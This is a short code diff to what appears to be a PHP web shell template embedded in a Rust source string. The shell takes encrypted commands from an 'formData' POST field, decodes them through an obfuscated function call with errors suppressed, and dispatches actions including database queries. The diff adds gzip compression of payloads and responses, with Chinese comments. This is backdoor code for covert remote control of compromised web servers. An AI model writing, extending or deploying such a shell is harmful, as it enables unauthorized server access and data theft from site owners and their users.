@@ -1799,6 +1799,9 @@ try{
 if(isset($_POST['formData'])){
     $b=is_string($_POST['formData'])?$_POST['formData']:'';
     $in=@$_g[1]($b);
+    /* 传输压缩（gzip）：载荷若为 gzip 字节则解压（目标无 zlib 时原样）；
+       同时回写 $b（AES 等变体按 $b 解密，需保持 base64 形式） */
+    if(function_exists('gzdecode')&&strlen($in)>2&&$in[0]=="\x1f"&&$in[1]=="\x8b"){$in=@gzdecode($in);$b=base64_encode($in);}
     __DECRYPT__
     $req=@json_decode($raw,true);
     if(!is_array($req)){$out='{"ok":false,"error":"bad params"}';}
@@ -1820,6 +1823,8 @@ if(isset($_POST['formData'])){
         elseif($h==__H_DBQUERY__){$out=__DBQ__(isset($req['c'])?(string)$req['c']:'',isset($req['q'])?(string)$req['q']:'');}
     }
     __ENCRYPT__
+    /* 传输压缩（gzip）：响应压缩（目标支持 zlib 时） */
+    if(function_exists('gzencode')){$enc=base64_encode(gzencode(base64_decode($enc),6));}
     echo json_encode(array('data'=>$enc,'code'=>200));
 }
 "#;
